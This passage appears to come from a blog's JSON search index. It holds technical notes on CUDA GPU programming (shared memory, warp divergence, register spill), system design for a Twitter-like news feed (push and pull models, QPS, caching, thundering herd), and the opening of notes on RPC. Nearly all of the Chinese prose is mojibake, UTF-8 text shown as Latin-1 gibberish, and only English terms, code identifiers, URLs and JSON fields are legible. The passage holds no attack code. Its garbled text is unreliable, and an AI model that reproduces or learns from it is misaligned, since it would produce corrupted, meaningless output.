è¿˜æ˜¯ CPU éƒ½å¯ä»¥ç›´æ¥è®¿é—®åˆ°ã€‚ thrust::device_vector åˆ™æ˜¯åœ¨ GPU ä¸Šåˆ†é…å†…å­˜ï¼Œthrust::host_vector åœ¨ CPU ä¸Šåˆ†é…å†…å­˜ã€‚ å¯ä»¥é€šè¿‡ = è¿ç®—ç¬¦åœ¨ thrust::device_vector å’Œ thrust::host_vector ä¹‹é—´æ‹·è´æ•°æ®ï¼Œä»–ä¼šè‡ªåŠ¨å¸®ä½ è°ƒç”¨ cudaMemcpyã€‚ æ¿å—å…±äº«å†…å­˜ GPU æ˜¯ç”±å¤šä¸ªæµå¼å¤šå¤„ç†å™¨ï¼ˆSMï¼‰ç»„æˆçš„ã€‚æ¯ä¸ª SM å¯ä»¥å¤„ç†ä¸€ä¸ªæˆ–å¤šä¸ªæ¿å—ã€‚ SM åˆç”±å¤šä¸ªæµå¼å•å¤„ç†å™¨ï¼ˆSPï¼‰ç»„æˆã€‚æ¯ä¸ª SP å¯ä»¥å¤„ç†ä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹ã€‚ æ¯ä¸ª SM éƒ½æœ‰è‡ªå·±çš„ä¸€å—å…±äº«å†…å­˜ï¼ˆshared memoryï¼‰ï¼Œä»–çš„æ€§è´¨ç±»ä¼¼äº CPU ä¸­çš„ç¼“å­˜â€”â€”å’Œä¸»å­˜ç›¸æ¯”å¾ˆå°ï¼Œä½†æ˜¯å¾ˆå¿«ï¼Œç”¨äºç¼“å†²ä¸´æ—¶æ•°æ®ã€‚ åœ¨ CUDA çš„è¯­æ³•ä¸­ï¼Œå…±äº«å†…å­˜å¯ä»¥é€šè¿‡å®šä¹‰ä¸€ä¸ªä¿®é¥°äº† __shared__ çš„å˜é‡æ¥åˆ›å»ºã€‚ 1__shared__ int local_sum[1024]; å†…å­˜å»¶è¿Ÿ SM æ‰§è¡Œä¸€ä¸ªæ¿å—ä¸­çš„çº¿ç¨‹æ—¶ï¼Œå¹¶ä¸æ˜¯å…¨éƒ¨åŒæ—¶æ‰§è¡Œçš„ã€‚è€Œæ˜¯ä¸€ä¼šå„¿æ‰§è¡Œè¿™ä¸ªçº¿ç¨‹ï¼Œä¸€ä¼šå„¿æ‰§è¡Œé‚£ä¸ªçº¿ç¨‹ã€‚æŸä¸ªçº¿ç¨‹æœ‰å¯èƒ½å› ä¸ºåœ¨ç­‰å¾…å†…å­˜æ•°æ®çš„æŠµè¾¾ï¼Œè¿™æ—¶å¤§å¯ä»¥åˆ‡æ¢åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ç»§ç»­æ‰§è¡Œè®¡ç®—ä»»åŠ¡ã€‚ å†…å­˜å»¶è¿Ÿæ˜¯é˜»ç¢ CPU æ€§èƒ½æå‡çš„ä¸€å¤§ç“¶é¢ˆã€‚ CPU è§£å†³æ–¹æ¡ˆæ˜¯è¶…çº¿ç¨‹æŠ€æœ¯ï¼Œä¸€ä¸ªç‰©ç†æ ¸æä¾›ä¸¤ä¸ªé€»è¾‘æ ¸ï¼Œå½“ä¸€ä¸ªé€»è¾‘æ ¸é™·å…¥å†…å­˜ç­‰å¾…æ—¶åˆ‡æ¢åˆ°å¦ä¸€ä¸ªé€»è¾‘æ ¸ä¸Šæ‰§è¡Œï¼Œé¿å…ç©ºè½¬ã€‚ GPU çš„è§£å†³æ–¹æ³•å°±æ˜¯å•ä¸ª SM æ‰§è¡Œå¾ˆå¤šä¸ªçº¿ç¨‹ï¼Œç„¶ååœ¨é‡åˆ°å†…å­˜ç­‰å¾…æ—¶ï¼Œå°±è‡ªåŠ¨åˆ‡æ¢åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ã€‚__syncthreads() ä¼šå¼ºåˆ¶åŒæ­¥å½“å‰æ¿å—å†…çš„æ‰€æœ‰çº¿ç¨‹ã€‚ çº¿ç¨‹ç»„åˆ†æ­§ï¼ˆwarp divergenceï¼‰ GPU çº¿ç¨‹ç»„ï¼ˆwarpï¼‰ä¸­ 32 ä¸ªçº¿ç¨‹å®é™…æ˜¯ç»‘åœ¨ä¸€èµ·æ‰§è¡Œçš„ï¼Œå°±åƒ CPU çš„ SIMD é‚£æ ·ã€‚å› æ­¤å¦‚æœå‡ºç°åˆ†æ”¯ï¼ˆifï¼‰è¯­å¥æ—¶ï¼Œå¦‚æœ 32 ä¸ª cond ä¸­æœ‰çš„ä¸ºçœŸæœ‰çš„ä¸ºå‡ï¼Œåˆ™ä¼šå¯¼è‡´ä¸¤ä¸ªåˆ†æ”¯éƒ½è¢«æ‰§è¡Œï¼ å»ºè®® GPU ä¸Šçš„ if å°½å¯èƒ½ 32 ä¸ªçº¿ç¨‹éƒ½å¤„äºåŒä¸€ä¸ªåˆ†æ”¯ï¼Œè¦ä¹ˆå…¨éƒ¨çœŸè¦ä¹ˆå…¨éƒ¨å‡ï¼Œå¦åˆ™å®é™…æ¶ˆè€—äº†ä¸¤å€æ—¶é—´ï¼ å¯„å­˜å™¨æ‰“ç¿»ï¼ˆregister spillï¼‰ æ¿å—ä¸­çº¿ç¨‹æ•°é‡è¿‡å¤šå¸¦æ¥çš„é—®é¢˜ã€‚ GPU çº¿ç¨‹çš„å¯„å­˜å™¨ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ä¸€å—æ¯”è¾ƒå°è€Œå—çš„å†…å­˜ï¼Œç§°ä¹‹ä¸ºå¯„å­˜å™¨ä»“åº“ï¼ˆregister fileï¼‰ã€‚æ¿å—å†…çš„æ‰€æœ‰çš„çº¿ç¨‹å…±ç”¨ä¸€ä¸ªå¯„å­˜å™¨ä»“åº“ã€‚ å½“æ¿å—ä¸­çš„çº¿ç¨‹æ•°é‡ï¼ˆblockDimï¼‰è¿‡å¤šæ—¶ï¼Œå°±ä¼šå¯¼è‡´æ¯ä¸ªçº¿ç¨‹èƒ½å¤Ÿåˆ†é…åˆ°çš„å¯„å­˜å™¨æ•°é‡æ€¥å‰§ç¼©å°ã€‚è€Œå¦‚æœä½ çš„ç¨‹åºæ°å¥½ç”¨åˆ°äº†éå¸¸å¤šçš„å¯„å­˜å™¨ï¼Œé‚£å°±æ²¡åŠæ³•å…¨éƒ¨è£…åœ¨é«˜æ•ˆçš„å¯„å­˜å™¨ä»“åº“é‡Œï¼Œè€Œæ˜¯è¦æŠŠä¸€éƒ¨åˆ†â€œæ‰“ç¿»â€åˆ°ä¸€çº§ç¼“å­˜ä¸­ï¼Œè¿™æ—¶å¯¹è¿™äº›å¯„å­˜å™¨è¯»å†™çš„é€Ÿåº¦å°±å’Œä¸€çº§ç¼“å­˜ä¸€æ ·ï¼Œç›¸å¯¹è€Œè¨€ä½æ•ˆäº†ã€‚è‹¥ä¸€çº§ç¼“å­˜è¿˜è£…ä¸ä¸‹ï¼Œé‚£ä¼šæ‰“ç¿»åˆ°æ‰€æœ‰ SM å…±ç”¨çš„äºŒçº§ç¼“å­˜ã€‚ å»¶è¿Ÿéšè—ï¼ˆlatency hidingï¼‰å¤±æ•ˆ æ¿å—ä¸­çš„çº¿ç¨‹æ•°é‡è¿‡å°‘å¸¦æ¥çš„é—®é¢˜ã€‚ å½“çº¿ç¨‹ç»„é™·å…¥å†…å­˜ç­‰å¾…æ—¶ï¼Œå¯ä»¥åˆ‡æ¢åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œç»§ç»­è®¡ç®—ï¼Œè¿™æ ·ä¸€ä¸ª warp çš„å†…å­˜å»¶è¿Ÿå°±è¢«å¦ä¸€ä¸ª warp çš„è®¡ç®—å»¶è¿Ÿç»™éšè—èµ·æ¥äº†ã€‚å› æ­¤ï¼Œå¦‚æœçº¿ç¨‹æ•°é‡å¤ªå°‘çš„è¯ï¼Œå°±æ— æ³•é€šè¿‡åœ¨å¤šä¸ª warp ä¹‹é—´è°ƒåº¦æ¥éšè—å†…å­˜ç­‰å¾…çš„å»¶è¿Ÿï¼Œä»è€Œä½æ•ˆã€‚ æœ€å¥½è®©æ¿å—ä¸­çš„çº¿ç¨‹æ•°é‡ï¼ˆblockDimï¼‰ä¸º32çš„æ•´æ•°å€ï¼Œå¦åˆ™å‡å¦‚æ˜¯ 33 ä¸ªçº¿ç¨‹çš„è¯ï¼Œé‚£è¿˜æ˜¯éœ€è¦å¯åŠ¨ä¸¤ä¸ª warpï¼Œå…¶ä¸­ç¬¬äºŒä¸ª warp åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ˜¯æœ‰æ•ˆçš„ï¼Œéå¸¸æµªè´¹ã€‚ å¯¹äºä½¿ç”¨å¯„å­˜å™¨è¾ƒå°‘ã€è®¿å­˜ä¸ºä¸»çš„æ ¸å‡½æ•°ï¼ˆä¾‹å¦‚çŸ¢é‡åŠ æ³•ï¼‰ï¼Œä½¿ç”¨å¤§ blockDim ä¸ºå®œã€‚åä¹‹ï¼ˆä¾‹å¦‚å…‰çº¿è¿½è¸ªï¼‰ä½¿ç”¨å° blockDimï¼Œä½†ä¹Ÿä¸å®œå¤ªå°ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"CUDA","slug":"Notes/CUDA","permalink":"https://racleray.github.io/categories/Notes/CUDA/"}],"tags":[{"name":"CUDA","slug":"CUDA","permalink":"https://racleray.github.io/tags/CUDA/"}],"author":"HeRui"},{"title":"ç³»ç»Ÿè®¾è®¡ç¬”è®°","slug":"ç³»ç»Ÿè®¾è®¡ç¬”è®°","date":"2023-07-13T11:19:37.000Z","updated":"2024-01-09T10:21:47.068Z","comments":true,"path":"posts/598ff250.html","link":"","permalink":"https://racleray.github.io/posts/598ff250.html","excerpt":"ç³»ç»Ÿè®¾è®¡åˆ†æ","text":"ä¸é¢å‘å¯¹è±¡ é¢å‘å¯¹è±¡ï¼šå…·ä½“ç»†åŒ–çš„è®¾è®¡ ç³»ç»Ÿè®¾è®¡ï¼šé«˜å±‹å»ºç“´ï¼Œç³»ç»Ÿæ¶æ„ ç¤ºä¾‹ï¼šè®¾è®¡ twitter ç³»ç»Ÿ é¦–å…ˆï¼Œå…ˆäº¤æµï¼Œæ¯”å¦‚ç”¨æˆ·è§„æ¨¡ã€ç¡¬ä»¶æ¡ä»¶ç­‰ã€‚ å¯è¡Œæ€§ work solution special case analysis tradeoff knowledge base 4Såˆ†æ Scenario, Service, Storage, Scale Scenario åœºæ™¯ è¯´äººè¯ï¼šéœ€è¦è®¾è®¡å“ªäº›åŠŸèƒ½ï¼Œè®¾è®¡å¾—å¤šç‰› Ask / Features / QPS / DAU / Interfaces Service æœåŠ¡ è¯´äººè¯ï¼šå°†å¤§ç³»ç»Ÿæ‹†åˆ†ä¸ºå°æœåŠ¡ Split / Application / Module Storage å­˜å‚¨ è¯´äººè¯ï¼šæ•°æ®å¦‚ä½•å­˜å‚¨ä¸è®¿é—® Schema / Data / SQL / NoSQL / File System Scale å‡çº§ è¯´äººè¯ï¼šè§£å†³ç¼ºé™·ï¼Œå¤„ç†å¯èƒ½é‡åˆ°çš„é—®é¢˜ Sharding / Optimize / Special Case Work solution . NOT perfect solution. Scenario éœ€è¦ä»€ä¹ˆåŠŸèƒ½ï¼›å¤šå¤§çš„è®¿é—®é‡ï¼ˆDaily active users, Monthly active users ...ï¼‰ ç¬¬ä¸€æ­¥ enumerateï¼Œç½—åˆ—åŠŸèƒ½ï¼š Register / Login User Profile Display / Edit Upload Image / Video * Search * Post / Share a tweet Timeline / News Feed Follow / Unfollow a user ç¬¬äºŒæ­¥ sortï¼Œé€‰å‡ºæ ¸å¿ƒåŠŸèƒ½ï¼š Post a Tweet Timeline News Feed Follow / Unfollow a user Register / Login ç¬¬ä¸‰æ­¥ analysis &amp; predict: å¹¶å‘ç”¨æˆ· concurrent user: æ—¥æ´»è·ƒ = æ¯ä¸ªç”¨æˆ·å¹³å‡è¯·æ±‚æ¬¡æ•° / ä¸€å¤©å¤šå°‘ç§’ å³°å€¼ Peak = average concurrent user * 3 å¯¹äºå¿«é€Ÿå¢é•¿çš„äº§å“ï¼šMAX peak in 3 months = peak users * 2 è¯»é¢‘ç‡ read qps å†™é¢‘ç‡ write qps QPS QPS = 100 ç”¨ä½ çš„ç¬”è®°æœ¬åš Web æœåŠ¡å™¨å°±å¥½äº† QPS = 1k ç”¨ä¸€å°å¥½ç‚¹çš„ Web æœåŠ¡å™¨å°±å·®ä¸å¤šäº†ï¼Œéœ€è¦è€ƒè™‘ Single Point Failure QPS = 1m éœ€è¦å»ºè®¾ä¸€ä¸ª1000å° Web æœåŠ¡å™¨çš„é›†ç¾¤ ï¼Œéœ€è¦è€ƒè™‘å¦‚ä½• Maintainanceï¼ˆæŸä¸€å°æŒ‚äº†æ€ä¹ˆåŠ QPS å’Œ Web Server (æœåŠ¡å™¨) / Database (æ•°æ®åº“) ä¹‹é—´çš„å…³ç³» ä¸€å° Web Server çº¦æ‰¿å—é‡æ˜¯ 1k çš„ QPS ï¼ˆè€ƒè™‘åˆ°é€»è¾‘å¤„ç†æ—¶é—´ä»¥åŠæ•°æ®åº“æŸ¥è¯¢çš„ç“¶é¢ˆï¼‰ ä¸€å° SQL Database çº¦æ‰¿å—é‡æ˜¯ 1k çš„ QPSï¼ˆå¦‚æœ JOIN å’Œ INDEX queryæ¯”è¾ƒå¤šçš„è¯ï¼Œè¿™ä¸ªå€¼ä¼šæ›´å°ï¼‰ ä¸€å° NoSQL Database (Cassandra) çº¦æ‰¿å—é‡æ˜¯ 10k çš„ QPS ä¸€å° NoSQL Database (Memcached) çº¦æ‰¿å—é‡æ˜¯ 1M çš„ QPS Service æœåŠ¡ å·®åˆ†ç³»ç»Ÿï¼š replay é‡æ”¾éœ€æ±‚ã€‚æ¯”å¦‚ï¼ŒUser Service, Tweet Service, Media Service, Friendship Service é’ˆå¯¹éœ€æ±‚ï¼Œæ·»åŠ æœåŠ¡ å½’å¹¶ç›¸åŒæœåŠ¡ merge å½’å¹¶éœ€æ±‚ Storage å­˜å‚¨ æ•°æ®åº“ç³»ç»Ÿï¼šå¯¹æ–‡ä»¶ç³»ç»Ÿçš„ä¸€å±‚åŒ…è£…ï¼Œæä¾›æ›´ä¸°å¯Œã€åŠŸèƒ½æ›´å¼ºå¤§çš„æ¥å£ å…³ç³»å‹æ•°æ®åº“ï¼šç”¨æˆ·ä¿¡æ¯ éå…³ç³»å‹æ•°æ®åº“ï¼šæ¨æ–‡ã€ç¤¾äº¤å›¾è°± æ–‡ä»¶ç³»ç»Ÿ å›¾ç‰‡ã€è§†é¢‘ ç¼“å­˜ ä¸æ”¯æŒæ•°æ®æŒä¹…åŒ– nonpersistent æ•ˆç‡é«˜ï¼Œå†…å­˜çº§è®¿é—®é€Ÿåº¦ ç¬¬ä¸€æ­¥ selectï¼šé€‰æ‹©åˆé€‚çš„å­˜å‚¨ç»“æ„ ç¬¬äºŒæ­¥ schemaï¼šç»†åŒ–æ•°æ®è¡¨ç»“æ„ ç¨‹åº = ç®—æ³• + æ•°æ®ç»“æ„ ç³»ç»Ÿ = æœåŠ¡ + æ•°æ®å­˜å‚¨ è®¾è®¡ schemaï¼š News Feed å¦‚ä½•å­˜å‚¨ ç™»å½•ä¹‹åçœ‹åˆ°çš„ä¿¡æ¯æµã€‚æ¯ä¸ªäººçœ‹åˆ°çš„å†…å®¹æ—¶ä¸åŒçš„ã€‚ Pull Model ä¸»åŠ¨æ‹‰å– ç®—æ³•ï¼šå°†æ¯ä¸ªå¥½å‹çš„å‰100æ¡ä¿¡æ¯ï¼Œåˆå¹¶å‡º100æ¡news feedã€‚ Merge K Sorted Arrays. å¤æ‚åº¦ï¼šNä¸ªå…³æ³¨å¯¹è±¡ï¼ŒNæ¬¡DB Reads æ—¶é—´ + å½’å¹¶æ—¶é—´ã€‚Post a tweet æ˜¯ä¸€æ¬¡ DB Write çš„æ—¶é—´ã€‚ ç¼ºé™·ï¼š Næ¬¡ DB Readséå¸¸æ…¢ Push Model ç®—æ³•ï¼š æ¯ä¸ªç”¨æˆ·ä¸€ä¸ª List å­˜å‚¨ä¸ªäººçš„ News Feed ä¿¡æ¯ å¥½å‹å‘å‡º tweet ï¼ŒåŒæ­¥åˆ°æ¯ä¸ªç”¨æˆ·çš„ List ä¸­ ï¼ˆå³ fanout è¿‡ç¨‹ï¼‰ ç”¨æˆ·æŸ¥è¯¢æ—¶ï¼Œåªéœ€è¦ä»Listä¸­è¯»å–100æ¡æœ€æ–°çš„ä¿¡æ¯ å¤æ‚åº¦ï¼š æŸ¥è¯¢ï¼Œæ‰§è¡Œä¸€æ¬¡ DB read postï¼ŒNä¸ªç²‰ä¸ï¼Œæ‰§è¡ŒNæ¬¡DB writeã€‚å¯å¼‚æ­¥æ‰§è¡Œã€‚ æ–°å»º News Feed Table å¯è®¾è®¡å¦‚ä¸‹ å»ºç«‹ç´¢å¼•ï¼šå¯¹äºå¾ˆå¤§çš„ tableï¼Œå¯å»ºç«‹ å¤åˆç´¢å¼•ï¼Œå…ˆæŒ‰xæ’åºï¼Œxç›¸åŒçš„å†æŒ‰ç…§yæ’åºï¼ŒæŸ¥è¯¢å¯ä»¥æ›´é«˜æ•ˆã€‚ æ¯”è¾ƒ Social Appçš„æ¨¡å‹ Facebook â€“ Pull Instagram â€“ Push + Pull Twitter -- Pull æœ‹å‹åœˆ -- Push ä¸ºäº†æ›´å¥½çš„ rankingï¼Œä¸€èˆ¬ä½¿ç”¨ Pull æ¨¡å‹ã€‚ Scale æ‰©å±• ä¼˜åŒ–ç³»ç»Ÿ ç¬¬ä¸€æ­¥ optimizeï¼šè®¾è®¡ç¼ºé™·ï¼›åŠŸèƒ½è®¾è®¡ï¼›ç‰¹æ®Šæƒ…å†µ ç¬¬äºŒæ­¥ maintenance: é²æ£’æ€§ï¼›æ‰©å±•æ€§ Pull ç¼ºé™· DB reads å‰åŠ å…¥ cache cache æ¯ä¸ªç”¨æˆ·çš„ timelineï¼štrade offï¼Œcacheå¤šå°‘ cache æ¯ä¸ªç”¨æˆ·çš„ news feedï¼šæ²¡æœ‰ cache æ—¶ï¼Œè¯»å–ï¼Œå½’å¹¶ï¼Œç„¶åå–100ï¼›æœ‰cacheæ—¶ï¼Œå½’å¹¶Nä¸ªç”¨æˆ·åœ¨æŸä¸ªæ—¶é—´æˆ³ä¹‹åçš„ tweets Quest: å¯¹æ¯” MySQL ä¸ Memcahed QPS Push ç¼ºé™· æ¶ˆè€—æ›´å¤šçš„ Disk ç©ºé—´ï¼ŒBUT disk is cheap. ï¼ˆPull å–æ•°æ®å­˜åœ¨ å†…å­˜ ä¸­ï¼‰ Inactive Usersï¼šç²‰ä¸æ’åºï¼Œæ¯”å¦‚æŒ‰ç™»å½•æ—¶é—´é¡ºåºæ’åºï¼Œå…ˆfanoutæ´»è·ƒç”¨æˆ· å¼‚æ­¥çš„ä¸€ç§æ½œåœ¨ç¼ºé™·ï¼šUnfollow ä¹‹åï¼Œåˆ·æ–° timeline å­˜åœ¨å»¶è¿Ÿ ç»“åˆ åœ¨ç°æœ‰æ¨¡å‹çš„åŸºç¡€ä¸Šï¼Œåšæœ€å°çš„æ”¹ï¼Œæ¯”å¦‚ç”¨æ›´å¤šçš„æœºå™¨è¿›è¡Œ Push çš„fanout å¯¹é•¿æœŸçš„å¢é•¿è¿›è¡Œä¼°è®¡ï¼Œè¯„ä¼°æ˜¯å¦å€¼å¾—è½¬æ¢æ¨¡å‹ ç»“åˆæ–¹æ¡ˆï¼š æ™®é€šç”¨æˆ·ï¼šPush æ˜æ˜Ÿç”¨æˆ·ï¼šä¸è¿›è¡Œ Push å½“ç”¨æˆ·éœ€è¦çš„æ—¶å€™ï¼Œä»æ˜æ˜Ÿç”¨æˆ·çš„timelineé‡Œå–ï¼Œå¹¶åˆå¹¶åˆ° news feed ä¸­ å‡ºç°é—®é¢˜ï¼šå¦‚ä½•å®šä¹‰ æ˜æ˜Ÿç”¨æˆ·ï¼Ÿå½“æ˜æ˜Ÿç”¨æˆ·çªç„¶å˜æˆæ™®é€šç”¨æˆ·ä» Pull æ¨¡å‹è½¬æ¢ä¸º Push æ¨¡å¼ï¼Œå¦‚ä½•ä¿è¯å‰æ˜æ˜Ÿç”¨æˆ·çš„ä¿¡æ¯æ¨é€åˆ°ç²‰ä¸ news feed ä¸­ï¼Ÿ æ˜¯ä¸æ˜¯æ˜æ˜Ÿä¸èƒ½åœ¨çº¿åŠ¨æ€è®¡ç®—ï¼Œè¦ç¦»çº¿è®¡ç®— ä¸º User å¢åŠ ä¸€ä¸ª is_superstar çš„å±æ€§ ä¸€ä¸ªç”¨æˆ·è¢«æ ‡è®°ä¸º superstar ä¹‹åï¼Œå°±ä¸èƒ½å†è¢«å–æ¶ˆæ ‡è®° é€‰æ‹© tradeoff ä»€ä¹ˆæ—¶å€™ç”¨ Push ï¼Ÿ èµ„æºå°‘ å°‘å†™ä»£ç  å®æ—¶æ€§è¦æ±‚ä¸é«˜ ç”¨æˆ·å‘å¸–å°‘ åŒå‘å¥½å‹å…³ç³»ï¼Œæ²¡æœ‰æ˜æ˜Ÿé—®é¢˜ï¼ˆæœ‹å‹åœˆï¼‰ ä»€ä¹ˆæ—¶å€™ç”¨ Pull ? èµ„æºå……è¶³ å®æ—¶æ€§è¦æ±‚é«˜ ç”¨æˆ·å‘å¸–å¾ˆå¤š å•å‘å¥½å‹å…³ç³»ï¼Œæœ‰æ˜æ˜Ÿé—®é¢˜ å…¶ä»–é€šç”¨é—®é¢˜ æ•°æ®åº“æœåŠ¡å™¨æŒ‚äº†æ€ä¹ˆåŠï¼Ÿ ç”¨æˆ·é€æ¸å¢åŠ æ€ä¹ˆåŠï¼Ÿ æœåŠ¡å™¨é¡¶ä¸ä½å‹åŠ› æ•°æ®åº“é¡¶ä¸ä½å‹åŠ› ç³»ç»Ÿè®¾è®¡æ€»ç»“ No more no less Work solution first Analysis is important than solution æ‹“å±•é—®é¢˜ï¼šNormalize VS Denormalize æ‰©å±•é—®é¢˜ï¼šæƒŠç¾¤ç°è±¡ Thundering Herd é€šå¸¸ä¼šä½¿ç”¨ç¼“å­˜æ¥ä½œä¸ºæ•°æ®åº“çš„â€œæŒ¡ç®­ç‰Œâ€ ï¼Œä¼˜åŒ–ä¸€äº›ç»å¸¸è¯»å–çš„æ•°æ®çš„è®¿é—®é€Ÿåº¦ã€‚ åœ¨é«˜å¹¶å‘æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€æ¡éå¸¸çƒ­çš„æ•°æ®ï¼Œå› ä¸º â€œç¼“å­˜è¿‡æœŸâ€ æˆ–è€… â€œè¢«æ·˜æ±°ç®—æ³•æ·˜æ±°â€ï¼Œ ç¼“å­˜ä¹‹åï¼Œä¼šå¯¼è‡´çŸ­æ—¶é—´å†…ï¼ˆ&lt;1sï¼‰, å¤§é‡çš„æ•°æ®è¯·æ±‚ä¼šå‡ºç° â€œç¼“å­˜ç©¿é€â€ï¼ˆCache Missï¼‰ï¼Œå› ä¸ºæ•°æ®ä» DB åˆ° Cache éœ€è¦æ—¶é—´ï¼Œä»è€Œè¿™äº›è¯·æ±‚éƒ½ä¼šå»è®¿é—®æ•°æ®åº“ï¼Œå¯¼è‡´æ•°æ®åº“å¤„ç†ä¸è¿‡æ¥è€Œå´©æºƒï¼Œä»è€Œå½±å“ åˆ°å…¶ä»–æ•°æ®çš„è®¿é—®è€Œå¯¼è‡´æ•´ä¸ªç½‘ç«™å´©æºƒã€‚ è§£å†³åŠæ³•åŠå‚è€ƒèµ„æ–™ Memcache Lease Get - ã€ŠScaling Memcache at Facebookã€‹http://bit.ly/1jDzKZK Facebook å¦‚ä½•è§£å†³æƒŠç¾¤æ•ˆåº”çš„ï¼šhttps://bit.ly/1Q3t3P7 Redis é˜²é›ªå´©æ¶æ„è®¾è®¡ https://bit.ly/2KFneb æ¶ˆæ¯é˜Ÿåˆ— å…ˆè¿›å…ˆå‡ºçš„ä»»åŠ¡é˜Ÿåˆ— åšä»»åŠ¡çš„workerè¿›ç¨‹å…±äº«ä¸€ä¸ªåˆ—è¡¨ workerä»ä»»åŠ¡åˆ—è¡¨ä¸­è·å–ä»»åŠ¡ï¼Œåšå®Œä¹‹ååé¦ˆç»™é˜Ÿåˆ—æœåŠ¡å™¨ é˜Ÿåˆ—æœåŠ¡å™¨æ˜¯åšå¼‚æ­¥ä»»åŠ¡å¿…é¡»è¦æœ‰çš„ç»„æˆéƒ¨åˆ† å¸¸ç”¨ï¼šRabbitMQã€ZeroMQã€Redisã€Kafka å…¶ä»–é—®é¢˜ news feed å¦‚ä½•å®ç° åˆ†é¡µ paginationï¼Ÿ twitter pull ç”¨ cache æ¥å­˜ timeline æ—¶ï¼Œå¦‚ä½•ä¿å­˜å®æ—¶æ€§é—®é¢˜ï¼Ÿ","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"System Design","slug":"Notes/System-Design","permalink":"https://racleray.github.io/categories/Notes/System-Design/"}],"tags":[{"name":"System Design","slug":"System-Design","permalink":"https://racleray.github.io/tags/System-Design/"}],"author":"HeRui"},{"title":"RPCç¬”è®°","slug":"RPCç¬”è®°","date":"2023-07-09T13:33:13.000Z","updated":"2024-01-09T10:21:27.146Z","comments":true,"path":"posts/4ac86dd1.html","link":"","permalink":"https://racleray.github.io/posts/4ac86dd1.html","excerpt":"RPCæŠ€æœ¯å­¦ä¹ ç¬”è®°","text":"é—®é¢˜åœºæ™¯ ä¸€ä¸ªå®Œæ•´çš„å¤§å‹æœåŠ¡ä¼šè¢«æ‰“æ•£æˆå¾ˆå¤šå¾ˆå¤šç‹¬ç«‹çš„å°æœåŠ¡ï¼Œæ¯ä¸ªå°æœåŠ¡ä¼šç”±ç‹¬ç«‹çš„è¿›ç¨‹å»ç®¡ç†æ¥å¯¹å¤–æä¾›æœåŠ¡ï¼Œä¹Ÿå°±æ˜¯ å¾®æœåŠ¡ ã€‚ç”¨æˆ·è¯·æ±‚çš„åˆ†å‘å’Œå¤„ç†ï¼Œå­æœåŠ¡å­ç³»ç»Ÿé—´ç»“æœçš„é€šä¿¡ï¼Œå‘ç”¨æˆ·è¿”å›ç»“æœï¼Œéƒ½æ˜¯RPCåº”å¯¹çš„åœºæ™¯ã€‚ ç®€ä»‹ RPC (Remote Procedure Call)å³è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼Œæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿå¸¸è§çš„ä¸€ç§é€šä¿¡æ–¹æ³•ã€‚å½“ä¸¤ä¸ªç‰©ç†åˆ†ç¦»çš„å­ç³»ç»Ÿéœ€è¦å»ºç«‹é€»è¾‘ä¸Šçš„å…³è”æ—¶ï¼ŒRPC æ˜¯é€šä¿¡çš„æŠ€æœ¯æ‰‹æ®µä¹‹ä¸€ã€‚é™¤ RPC ä¹‹å¤–ï¼Œå¸¸è§çš„å¤šç³»ç»Ÿæ•°æ®äº¤äº’æ–¹æ¡ˆè¿˜æœ‰åˆ†å¸ƒå¼==æ¶ˆæ¯é˜Ÿåˆ—==ã€==HTTP è¯·æ±‚è°ƒç”¨==ã€==æ•°æ®åº“==å’Œ==åˆ†å¸ƒå¼ç¼“å­˜==ç­‰ã€‚ RPC å’Œ HTTP è°ƒç”¨æ˜¯æ²¡æœ‰ç»è¿‡ä¸­é—´ä»¶çš„ï¼Œå®ƒä»¬æ˜¯ç«¯åˆ°ç«¯ç³»ç»Ÿçš„ç›´æ¥æ•°æ®äº¤äº’ã€‚HTTP è°ƒç”¨å…¶å®ä¹Ÿå¯ä»¥çœ‹æˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„ RPCã€‚çŸ¥ååº”ç”¨æœ‰ Nginx/Redis/MySQL/Dubbo/Hadoop/Spark/Tensorflow ç­‰äº§å“ã€‚ Nginx ä¸ RPC Ngnix å¯ä»¥ä¸ºåç«¯åˆ†å¸ƒå¼æœåŠ¡æä¾›è´Ÿè½½å‡è¡¡çš„åŠŸèƒ½ï¼Œå®ƒå¯ä»¥å°†åç«¯å¤šä¸ªæœåŠ¡åœ°å€èšåˆä¸ºå•ä¸ªåœ°å€æ¥å¯¹å¤–æä¾›æœåŠ¡ã€‚ Nginx å’Œåç«¯æœåŠ¡ä¹‹é—´çš„äº¤äº’åœ¨æœ¬è´¨ä¸Šä¹Ÿå¯ä»¥ç†è§£ä¸º RPC æ•°æ®äº¤äº’ã€‚é™¤äº†HTTPï¼ŒNginx å’Œåç«¯æœåŠ¡ä¹‹é—´è¿˜å¯ä»¥èµ°å…¶å®ƒçš„åè®®ï¼Œæ¯”å¦‚ uwsgi åè®®ã€fastcgi åè®®ç­‰ï¼Œè¿™ä¸¤ä¸ªåè®®éƒ½æ˜¯é‡‡ç”¨äº†æ¯” HTTP åè®®æ›´åŠ èŠ‚çœæµé‡çš„äºŒè¿›åˆ¶åè®®ã€‚ uWSGI æ˜¯è‘—åçš„ Python å®¹å™¨ï¼Œä½¿ç”¨å®ƒå¯ä»¥å¯åŠ¨ uwsgi åè®®çš„æœåŠ¡å™¨å¯¹å¤–æä¾›æœåŠ¡ã€‚ Hadoop ä¸ RPC å¤§æ•°æ®éœ€è¦é€šä¿¡çš„é‡æ¯”ä¸šåŠ¡ç³»ç»Ÿæ›´åŠ åºå¤§ï¼Œæ‰€ä»¥åœ¨æ•°æ®é€šä¿¡ä¼˜åŒ–ä¸Šåšçš„æ›´æ·±ã€‚ Hadoop æ–‡ä»¶ç³»ç»Ÿ hdfsï¼Œä¸€èˆ¬åŒ…æ‹¬ä¸€ä¸ª NameNode å’Œå¤šä¸ª DataNodeï¼ŒNameNode å’Œ DataNode ä¹‹é—´å°±æ˜¯é€šè¿‡ä¸€ç§ç§°ä¸º Hadoop RPC 